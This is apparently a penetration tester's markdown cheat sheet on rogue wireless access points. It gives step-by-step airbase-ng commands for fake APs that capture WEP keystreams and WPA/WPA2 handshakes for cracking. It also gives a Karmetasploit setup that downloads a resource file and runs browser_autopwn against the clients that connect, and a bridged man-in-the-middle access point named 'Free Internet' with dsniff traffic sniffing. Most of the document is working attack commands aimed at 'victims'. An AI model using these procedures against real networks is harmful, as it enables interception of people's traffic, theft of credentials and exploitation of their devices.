# Rogue Access point 

Convince wireless clients to connect to your attacking system. 

## Airbase-ng 

When wireless clients send out probes to connect to the legitamate AP, airbase-ng will send a response telling it to connect to the attackers AP. 

```
airbase-ng <options> <replay interface>
```

The options are as follows: 

Option          Param           Description
-a              bssid           set the AP MAC address
-i              iface           Capture packets from the specified interface
-w              WEP key         Use the provided WEP key to encrypt/decrypt packets
-h              MAC             Source MAC for MITM mode
-f              disallow        Disallow specified client MACs
-W              0/1             [Donâ€™t] set WEP flag in beacons (default: auto)
-q                              Quiet (do not print statistics)
-v                              Verbose (print more messages)
-A                              Ad-Hoc mode (allows other clients to peer)
-Y             in/out/both      External packet processing
-c             channel          Set the AP channel
-X                              Hidden ESSID
-s                              Force shared key authentication
-S                              Set shared key challenge length (default: 128)
-L                              Caffe-Latte attack
-N                              Hirte attack (cfrag attack)
-x             nbpps            Number of packets per second (default: 100)
-z             type             Sets WPA1 tags. 1=WEP40, 2=TKIP, 3=WRAP, 4=CCMP, 5=WEP104
-Z             type             Same as -z, but for WPA2
-V             type             Fake EAPOL. 1=MD5, 2=SHA1, 3=Auto

The filters are as follows: 

Option          Param           Description
--bssid         MAC             BSSID to filter
--bssids        file            Read a list of BSSIDs from the given file
--client        MAC             MAC address of the client to accept
--clients       file            Read a list of clients from the given file
--essid         ESSID           Specify a single ESSID
--essids        file            Read a list of ESSIDs from the given file


### WEP Shared key capture 

Capture the PGRA from a client by setting up a fake access point as follows: 

```
airbase-ng -c <Channel> -e <ESSID> -s -W 1 <interface>
```


-c: Specifies the channel to transmit on
-e: Filters a single SSID
-s: Forces shared key authentication
-W 1: Forces the beacons to specify WEP

### WPA Handshake capture 

```
airbase-ng -c <Channel> -e <ESSID> -z 2 -W 1 <interface>
```

-c: Specifies the fake AP channel
-e: Filters to a single SSID
-z 2: Specifies TKIP
-W 1: Sets the WEP flag. Some clients get confused if this is not set

For WPA2 CCMP use:

```
airbase-ng -c <Channel> -e <ESSID> -Z 4 <interface>
```

This captures the WPA2 handshake and therefore, we can crack it using previous methods shown. 



## Karmetasploit

Uses a combination of Karma Attack, the aircrack-ng suite and the metasploit exploitation framework. Once a victim is associated with a malicious access point, attacks such as MITM and exploiting the client can be carried out. 

### Setup dependencies

Karmetasploit depends on a DHCP server to run. 

```
apt-get install dhcp3-server
mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd/
touch /var/lib/dhcp3/dhcpd.leases
```

Create a DHCP.conf file under /tmp/ to serve the IP addresses to victims. 

```
root@backtrack:~# cat /tmp/dhcpd.conf

default-lease-time 60; max-lease-time 72; ddns-update-style none; authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 { range 10.0.0.100 10.0.0.254;
option routers 10.0.0.1;
option domain-name-servers 10.0.0.1;}
```

Create an empty log file and change it's ownership to dhcpd

```
touch /tmp/dhcp.log 
chown dhcpd:dhcpd /tmp/dhcp.log
```

### Setup fake AP

```
airmon-ng start wlan0 <channel>
airbase-ng -c <Channel> -P -C 30 -e <ESSID> -v <interface>
```
where: 

-c: The channel to broadcast on
-P: Respond to all probe requests regardless of ESSID
-C 30: Re-broadcast the ESSIDs every 30 seconds
-e: The ESSID name to broadcast
-v: Enable verbose output

Bring up the at0 interface with an IP address

```
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
```


Start the DHCP server

```
dhcp3 -f -cf <config file> -pf <pid file> -lf <log file> <interface>
(dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0)
```

Where:

-f: Run the server as a process
-cf: The path to the configuration file
-pf: The path to the pid file
-lf: The path to the log file

Grab the karmetasploit resource file from the metasploit website, which contains commands that will be launched automatically within the msfconsole when it is started. 

```
wget -q http://metasploit.com/users/hdm/tools/karma.rc
```

Before using the file, it needs to be edited. Comment out the first two lines: 

```
#load db_sqlite3
#db_create /root/karma.db

use auxiliary/server/browser_autopwn
```

Launch msfconsole with the resource file

```
msfconsole -r /root/karma.rc
```

## Man In The Middle

Put card into monitor mode 

```
airmon-ng start wlan0 
```

Set up a fake access point

```
airbase-ng -c 3 -e "Free Internet" mon0
```


Create bridge for eth0 and at0. 

```
brctl addbr <bridge name>
brctl addbr eth0toat0
```

Add interfaces to the bridge

```
brctl addif <bridge name> <interface>
brctl addif eth0toat0 eth0
brctl addif eth0toat0 at0
```

Assign IP addresses and bring up all the interfaces. eth0 and at0 can be assigned 0.0.0.0 but the bridge interface needs to have a valid IP address for the wired network. 

```
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig eth0toat0 192.168.1.8 up
```

Enable IP forwarding on the attacking machine 

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Sniff the MITM traffic 

```
dsniff -i at0 
```


